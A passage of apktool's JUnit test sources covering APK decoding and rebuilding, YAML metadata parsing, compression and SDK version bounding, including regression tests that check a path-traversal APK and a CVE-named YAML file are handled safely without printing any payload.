        assertEquals("v1.0.0", testInfo.getVersionInfo().getVersionName());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/ResourceDirectoryTraversalTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.res.table.ResEntrySpec;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class ResourceDirectoryTraversalTest extends BaseTest {
    private static final String TEST_APK = "GHSA-2hqv-2xv4-5h5w.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(ResourceDirectoryTraversalTest.class, "arbitrary_write", sTmpDir);
    }

    @Test
    public void checkIfMaliciousRawFileRenamed() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "res/raw/" + ResEntrySpec.RENAMED_PREFIX + "0x7f040000").exists());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/SharedLibraryTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class SharedLibraryTest extends BaseTest {
    private static final String LIBRARY_APK = "library.apk";
    private static final String CLIENT_APK = "client.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(SharedLibraryTest.class, "shared_library", sTmpDir);
    }

    @Test
    public void isSharedResourceDecodingAndRebuildingWorking() throws Exception {
        sConfig.setLibraryFiles(new String[] {
            "com.google.android.test.shared_library:" + new File(sTmpDir, LIBRARY_APK).getAbsolutePath()
        });

        // decode library.apk
        File libraryApk = new File(sTmpDir, LIBRARY_APK);
        File libraryDir = new File(libraryApk + ".out");
        new ApkDecoder(libraryApk, sConfig).decode(libraryDir);

        // decode client.apk
        File clientApk = new File(sTmpDir, CLIENT_APK);
        File clientDir = new File(clientApk + ".out");
        new ApkDecoder(clientApk, sConfig).decode(clientDir);

        // build library.apk
        new ApkBuilder(libraryDir, sConfig).build(null);

        assertTrue(new File(libraryDir, "dist/" + libraryApk.getName()).exists());

        // build client.apk
        new ApkBuilder(clientDir, sConfig).build(null);

        assertTrue(new File(clientDir, "dist/" + clientApk.getName()).exists());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/SkipAssetTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class SkipAssetTest extends BaseTest {
    private static final String TEST_APK = "issue1605.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(SkipAssetTest.class, "issue1605", sTmpDir);
    }

    @Test
    public void checkIfEnablingSkipAssetWorks() throws Exception {
        sConfig.setDecodeAssets(Config.DecodeAssets.NONE);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.none");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertFalse(new File(testDir, "assets/kotlin.kotlin_builtins").isFile());
        assertFalse(new File(testDir, "assets/ranges/ranges.kotlin_builtins").isFile());
    }

    @Test
    public void checkControl() throws Exception {
        sConfig.setDecodeAssets(Config.DecodeAssets.FULL);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.full");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "assets/kotlin.kotlin_builtins").isFile());
        assertTrue(new File(testDir, "assets/ranges/ranges.kotlin_builtins").isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/SparseFlagTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.ApkInfo;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class SparseFlagTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        log("Unpacking sparse.apk && not-sparse.apk...");
        copyResourceDir(SparseFlagTest.class, "sparse", sTmpDir);
    }

    @Test
    public void decodeWithExpectationOfSparseEntries() throws Exception {
        sConfig.setFrameworkTag("issue-3298");

        log("Decoding sparse.apk...");
        File testApk = new File(sTmpDir, "sparse.apk");
        File testDir = new File(testApk + ".out");
        ApkDecoder apkDecoder = new ApkDecoder(testApk, sConfig);
        apkDecoder.decode(testDir);
        ApkInfo apkInfo = apkDecoder.getApkInfo();

        assertTrue("Expecting sparse entries", apkInfo.getResourcesInfo().isSparseEntries());

        log("Building sparse.apk...");
        new ApkBuilder(testDir, sConfig).build(null);
    }

    @Test
    public void decodeWithExpectationOfNoSparseEntries() throws Exception {
        sConfig.setFrameworkTag("issue-3298");

        log("Decoding not-sparse.apk...");
        File testApk = new File(sTmpDir, "not-sparse.apk");
        File testDir = new File(testApk + ".out");
        ApkDecoder apkDecoder = new ApkDecoder(testApk, sConfig);
        apkDecoder.decode(testDir);
        ApkInfo apkInfo = apkDecoder.getApkInfo();

        assertFalse("Expecting not-sparse entries", apkInfo.getResourcesInfo().isSparseEntries());

        log("Building not-sparse.apk...");
        new ApkBuilder(testDir, sConfig).build(null);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/UnknownCompressionTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.directory.ExtFile;

import org.junit.*;
import static org.junit.Assert.*;

public class UnknownCompressionTest extends BaseTest {
    private static ExtFile sTestApk;
    private static ExtFile sNewApk;

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(UnknownCompressionTest.class, "unknown_compression", sTmpDir);

        sConfig.setFrameworkDirectory(sTmpDir.getAbsolutePath());

        log("Building unknown_compression.apk...");
        sTestApk = new ExtFile(sTmpDir, "unknown_compression.apk");
        ExtFile testDir = new ExtFile(sTestApk + ".out");
        new ApkDecoder(sTestApk, sConfig).decode(testDir);

        log("Decoding unknown_compression.apk...");
        new ApkBuilder(testDir, sConfig).build(null);
        sNewApk = new ExtFile(testDir, "dist/" + sTestApk.getName());
    }

    @AfterClass
    public static void afterClass() throws Exception {
        sTestApk.close();
        sNewApk.close();
    }

    @Test
    public void pkmExtensionDeflatedTest() throws Exception {
        String fileName = "assets/bin/Data/test.pkm";
        int control = sTestApk.getDirectory().getCompressionLevel(fileName);
        int rebuilt = sNewApk.getDirectory().getCompressionLevel(fileName);

        // Check that control = rebuilt (both deflated)
        // Add extra check for checking not equal to 0, just in case control gets broken
        assertEquals(control, rebuilt);
        assertNotEquals(0, rebuilt);
    }

    @Test
    public void doubleExtensionStoredTest() throws Exception {
        String fileName = "assets/bin/Data/two.extension.file";
        int control = sTestApk.getDirectory().getCompressionLevel(fileName);
        int rebuilt = sNewApk.getDirectory().getCompressionLevel(fileName);

        // Check that control = rebuilt (both stored)
        // Add extra check for checking = 0 to enforce check for stored just in case control breaks
        assertEquals(control, rebuilt);
        assertEquals(0, rebuilt);
    }

    @Test
    public void confirmJsonFileIsDeflatedTest() throws Exception {
        String fileName = "test.json";
        int control = sTestApk.getDirectory().getCompressionLevel(fileName);
        int rebuilt = sNewApk.getDirectory().getCompressionLevel(fileName);

        assertEquals(control, rebuilt);
        assertEquals(8, rebuilt);
    }

    @Test
    public void confirmPngFileIsStoredTest() throws Exception {
        String fileName = "950x150.png";
        int control = sTestApk.getDirectory().getCompressionLevel(fileName);
        int rebuilt = sNewApk.getDirectory().getCompressionLevel(fileName);

        assertNotEquals(control, rebuilt);
        assertEquals(0, rebuilt);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/VectorDrawableTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class VectorDrawableTest extends BaseTest {
    private static final String TEST_APK = "issue1456.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(VectorDrawableTest.class, "issue1456", sTmpDir);
    }

    @Test
    public void checkIfDrawableFileDecodesProperly() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "res/drawable/ic_arrow_drop_down_black_24dp.xml").isFile());
        assertTrue(new File(testDir, "res/drawable/ic_android_black_24dp.xml").isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/meta/ApkInfoReaderTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class ApkInfoReaderTest extends BaseTest {

    @Test
    public void testStandard() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/standard.yml"));
        checkStandard(apkInfo);
        assertEquals("2.8.1", apkInfo.getVersion());
    }

    @Test
    public void testUnknownFields() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/unknown_fields.yml"));
        checkStandard(apkInfo);
        assertEquals("2.8.1", apkInfo.getVersion());
    }

    @Test
    public void testSkipIncorrectIndent() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/skip_incorrect_indent.yml"));
        checkStandard(apkInfo);
        assertNotEquals("2.0.0", apkInfo.getVersion());
    }

    @Test
    public void testFirstIncorrectIndent() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/first_incorrect_indent.yml"));
        checkStandard(apkInfo);
        assertNotEquals("2.0.0", apkInfo.getVersion());
    }

    private void checkStandard(ApkInfo apkInfo) {
        assertEquals("standard.apk", apkInfo.getApkFileName());
        assertEquals(1, apkInfo.getDoNotCompress().size());
        assertEquals("arsc", apkInfo.getDoNotCompress().get(0));
        assertNotNull(apkInfo.getResourcesInfo());
        assertEquals(127, apkInfo.getResourcesInfo().getPackageId());
        assertNull(apkInfo.getResourcesInfo().getPackageName());
        assertFalse(apkInfo.getResourcesInfo().isSparseEntries());
        assertNotNull(apkInfo.getSdkInfo());
        assertEquals("25", apkInfo.getSdkInfo().getMinSdkVersion());
        assertEquals("30", apkInfo.getSdkInfo().getTargetSdkVersion());
        assertNotNull(apkInfo.getUsesFramework());
        assertNotNull(apkInfo.getUsesFramework().getIds());
        assertEquals(1, apkInfo.getUsesFramework().getIds().size());
        assertEquals(1, apkInfo.getUsesFramework().getIds().get(0).intValue());
        assertNull(apkInfo.getUsesFramework().getTag());
        assertNotNull(apkInfo.getVersionInfo());
        assertEquals(-1, apkInfo.getVersionInfo().getVersionCode());
        assertNull(apkInfo.getVersionInfo().getVersionName());
    }

    @Test
    public void testUnknownFiles() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/unknown_files.yml"));
        assertEquals("2.0.0", apkInfo.getVersion());
        assertEquals("testapp.apk", apkInfo.getApkFileName());
        assertNotNull(apkInfo.getUsesFramework());
        assertEquals(1, apkInfo.getUsesFramework().getIds().size());
        assertEquals(1, apkInfo.getUsesFramework().getIds().get(0).intValue());
        assertNotNull(apkInfo.getResourcesInfo());
        assertEquals(127, apkInfo.getResourcesInfo().getPackageId());
        assertNotNull(apkInfo.getVersionInfo());
        assertEquals(1, apkInfo.getVersionInfo().getVersionCode());
        assertEquals("1.0", apkInfo.getVersionInfo().getVersionName());
        assertNotNull(apkInfo.getDoNotCompress());
        assertEquals(5, apkInfo.getDoNotCompress().size());
        assertEquals("assets/0byte_file.jpg", apkInfo.getDoNotCompress().get(0));
        assertEquals("arsc", apkInfo.getDoNotCompress().get(1));
        assertEquals("png", apkInfo.getDoNotCompress().get(2));
        assertEquals("mp3", apkInfo.getDoNotCompress().get(3));
        assertEquals("stored.file", apkInfo.getDoNotCompress().get(4));
    }

    @Test
    public void testListWithIndent() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/list_with_indent.yml"));
        assertEquals("2.8.0", apkInfo.getVersion());
        assertEquals("basic.apk", apkInfo.getApkFileName());
        assertNotNull(apkInfo.getUsesFramework());
        assertEquals(1, apkInfo.getUsesFramework().getIds().size());
        assertEquals(1, apkInfo.getUsesFramework().getIds().get(0).intValue());
        assertEquals("tag", apkInfo.getUsesFramework().getTag());
        assertNotNull(apkInfo.getResourcesInfo());
        assertEquals(127, apkInfo.getResourcesInfo().getPackageId());
        assertEquals("com.test.basic", apkInfo.getResourcesInfo().getPackageName());
        assertTrue(apkInfo.getResourcesInfo().isSparseEntries());
        assertNotNull(apkInfo.getSdkInfo());
        assertEquals("4", apkInfo.getSdkInfo().getMinSdkVersion());
        assertEquals("22", apkInfo.getSdkInfo().getTargetSdkVersion());
        assertEquals("30", apkInfo.getSdkInfo().getMaxSdkVersion());
        assertNotNull(apkInfo.getVersionInfo());
        assertEquals(71, apkInfo.getVersionInfo().getVersionCode());
        assertEquals("1.0.70", apkInfo.getVersionInfo().getVersionName());
        assertNotNull(apkInfo.getDoNotCompress());
        assertEquals(2, apkInfo.getDoNotCompress().size());
        assertEquals("arsc", apkInfo.getDoNotCompress().get(0));
        assertEquals("png", apkInfo.getDoNotCompress().get(1));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/meta/ApkInfoSerializationTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class ApkInfoSerializationTest extends BaseTest {

    @Test
    public void checkApkInfoSerialization() throws Exception {
        ApkInfo control = ApkInfo.load(getClass().getResourceAsStream("/meta/unknown_files.yml"));
        check(control);
        control.save(sTmpDir);

        check(ApkInfo.load(sTmpDir));
    }

    private void check(ApkInfo apkInfo) {
        assertEquals("2.0.0", apkInfo.getVersion());
        assertEquals("testapp.apk", apkInfo.getApkFileName());
        assertNotNull(apkInfo.getUsesFramework());
        assertEquals(1, apkInfo.getUsesFramework().getIds().size());
        assertEquals(1, apkInfo.getUsesFramework().getIds().get(0).intValue());
        assertNotNull(apkInfo.getResourcesInfo());
        assertEquals(127, apkInfo.getResourcesInfo().getPackageId());
        assertNotNull(apkInfo.getVersionInfo());
        assertEquals(1, apkInfo.getVersionInfo().getVersionCode());
        assertEquals("1.0", apkInfo.getVersionInfo().getVersionName());
        assertNotNull(apkInfo.getDoNotCompress());
        assertEquals(5, apkInfo.getDoNotCompress().size());
        assertEquals("assets/0byte_file.jpg", apkInfo.getDoNotCompress().get(0));
        assertEquals("arsc", apkInfo.getDoNotCompress().get(1));
        assertEquals("png", apkInfo.getDoNotCompress().get(2));
        assertEquals("mp3", apkInfo.getDoNotCompress().get(3));
        assertEquals("stored.file", apkInfo.getDoNotCompress().get(4));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/meta/ConsistentPropertyTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class ConsistentPropertyTest extends BaseTest {

    @Test
    public void testAssertingAllKnownApkInfoProperties() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/basic.yml"));
        assertEquals("2.8.0", apkInfo.getVersion());
        assertEquals("basic.apk", apkInfo.getApkFileName());
        assertEquals(1, apkInfo.getUsesFramework().getIds().size());
        assertEquals("tag", apkInfo.getUsesFramework().getTag());
        assertEquals("4", apkInfo.getSdkInfo().getMinSdkVersion());
        assertEquals("22", apkInfo.getSdkInfo().getTargetSdkVersion());
        assertEquals("30", apkInfo.getSdkInfo().getMaxSdkVersion());
        assertEquals(127, apkInfo.getResourcesInfo().getPackageId());
        assertEquals("com.test.basic", apkInfo.getResourcesInfo().getPackageName());
        assertTrue(apkInfo.getResourcesInfo().isSparseEntries());
        assertEquals(71, apkInfo.getVersionInfo().getVersionCode());
        assertEquals("1.0.70", apkInfo.getVersionInfo().getVersionName());
        assertEquals(2, apkInfo.getDoNotCompress().size());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/meta/DoNotCompressHieroglyphTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class DoNotCompressHieroglyphTest extends BaseTest {

    @Test
    public void testHieroglyph() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/donotcompress_with_hieroglyph.yml"));
        assertEquals("2.0.0", apkInfo.getVersion());
        assertEquals("testapp.apk", apkInfo.getApkFileName());
        assertEquals(2, apkInfo.getDoNotCompress().size());
        assertEquals("assets/AllAssetBundles/Andriod/tx_1001_冰原1", apkInfo.getDoNotCompress().get(0));
        assertEquals("assets/AllAssetBundles/Andriod/tx_1001_冰原1.manifest", apkInfo.getDoNotCompress().get(1));
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/meta/InvalidSdkBoundingTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class InvalidSdkBoundingTest extends BaseTest {

    @Test
    public void checkIfInvalidValuesPass() {
        SdkInfo sdkInfo = new SdkInfo();
        sdkInfo.setMinSdkVersion("15");
        sdkInfo.setTargetSdkVersion("25");
        sdkInfo.setMaxSdkVersion("19");

        assertEquals("19", sdkInfo.getTargetSdkVersionBounded());
    }

    @Test
    public void checkIfMissingMinPasses() {
        SdkInfo sdkInfo = new SdkInfo();
        sdkInfo.setTargetSdkVersion("25");
        sdkInfo.setMaxSdkVersion("19");

        assertEquals("19", sdkInfo.getTargetSdkVersionBounded());
    }

    @Test
    public void checkIfMissingMaxPasses() {
        SdkInfo sdkInfo = new SdkInfo();
        sdkInfo.setMinSdkVersion("15");
        sdkInfo.setTargetSdkVersion("25");

        assertEquals("25", sdkInfo.getTargetSdkVersionBounded());
    }

    @Test
    public void checkIfMissingBothPasses() {
        SdkInfo sdkInfo = new SdkInfo();
        sdkInfo.setTargetSdkVersion("25");

        assertEquals("25", sdkInfo.getTargetSdkVersionBounded());
    }

    @Test
    public void checkForSdkCodenameOTag() {
        SdkInfo sdkInfo = new SdkInfo();
        sdkInfo.setTargetSdkVersion("O");

        assertEquals("26", sdkInfo.getTargetSdkVersionBounded());
    }

    @Test
    public void checkForSdkCodenameSTag() {
        SdkInfo sdkInfo = new SdkInfo();
        sdkInfo.setTargetSdkVersion("S");

        assertEquals("31", sdkInfo.getTargetSdkVersionBounded());
    }

    @Test
    public void checkForSdkDevelopmentInsaneTestValue() {
        SdkInfo sdkInfo = new SdkInfo();
        sdkInfo.setTargetSdkVersion("SDK_CUR_DEVELOPMENT");

        assertEquals("10000", sdkInfo.getTargetSdkVersionBounded());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/meta/MaliciousYamlTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.BaseTest;

import org.junit.*;
import static org.junit.Assert.*;

public class MaliciousYamlTest extends BaseTest {

    @Test
    public void testMaliciousYaml() throws Exception {
        ApkInfo apkInfo = ApkInfo.load(getClass().getResourceAsStream("/meta/cve20220476.yml"));
        assertEquals("2.6.1-ddc4bb-SNAPSHOT", apkInfo.getVersion());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/meta/YamlLineTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.meta;

import brut.androlib.BaseTest;
import brut.yaml.YamlLine;

import org.junit.*;
import static org.junit.Assert.*;

public class YamlLineTest extends BaseTest {

    @Test
    public void testEmptyLine() {
        YamlLine line = new YamlLine("");
        assertEquals(0, line.indent);
        assertTrue(line.isEmpty);

        line = new YamlLine(" ");
        assertEquals(0, line.indent);
        assertTrue(line.isEmpty);
    }

    @Test
    public void testComment() {
        YamlLine line = new YamlLine("!ApkInfo.class");
        assertTrue(line.isComment);

        line = new YamlLine("# This is comment");
        assertEquals(0, line.indent);
        assertTrue(line.isComment);
        assertEquals("", line.getKey());
        assertEquals("This is comment", line.getValue());

        line = new YamlLine("  # This is comment");
        assertEquals(2, line.indent);
        assertTrue(line.isComment);
        assertEquals("", line.getKey());
        assertEquals("This is comment", line.getValue());
    }

    @Test
    public void testKeyLine() {
        YamlLine line = new YamlLine("name:");
        assertFalse(line.isComment);
        assertEquals(0, line.indent);
        assertEquals("name", line.getKey());
        assertEquals("", line.getValue());

        line = new YamlLine("  name:");
        assertFalse(line.isComment);
        assertEquals(2, line.indent);
        assertEquals("name", line.getKey());
        assertEquals("", line.getValue());

        line = new YamlLine(":value");
        assertFalse(line.isComment);
        assertEquals(0, line.indent);
        assertEquals("", line.getKey());
        assertEquals("value", line.getValue());

        line = new YamlLine("  : value ");
        assertFalse(line.isComment);
        assertEquals(2, line.indent);
        assertEquals("", line.getKey());
        assertEquals("value", line.getValue());

        line = new YamlLine("name  : value ");
        assertFalse(line.isComment);
        assertEquals(0, line.indent);
        assertEquals("name", line.getKey());
        assertEquals("value", line.getValue());

        line = new YamlLine("  name  : value ");
        assertFalse(line.isComment);
        assertEquals(2, line.indent);
        assertEquals("name", line.getKey());
        assertEquals("value", line.getValue());

        line = new YamlLine("  name  : value ::");
        assertFalse(line.isComment);
        assertEquals(2, line.indent);
        assertEquals("name", line.getKey());
        assertEquals("value", line.getValue());

        // split this gives parts.length = 0!!
        line = new YamlLine(":::");
        assertFalse(line.isComment);
        assertEquals(0, line.indent);
        assertEquals("", line.getKey());
        assertEquals("", line.getValue());
    }

    @Test
    public void testItemLine() {
        YamlLine line = new YamlLine("- val1");
        assertTrue(line.isItem);
        assertEquals(0, line.indent);
        assertEquals("", line.getKey());
        assertEquals("val1", line.getValue());

        line = new YamlLine("  - val1: ff");
        assertTrue(line.isItem);
        assertEquals(2, line.indent);
        assertEquals("", line.getKey());
        assertEquals("val1: ff", line.getValue());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/res/AaptVersionTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
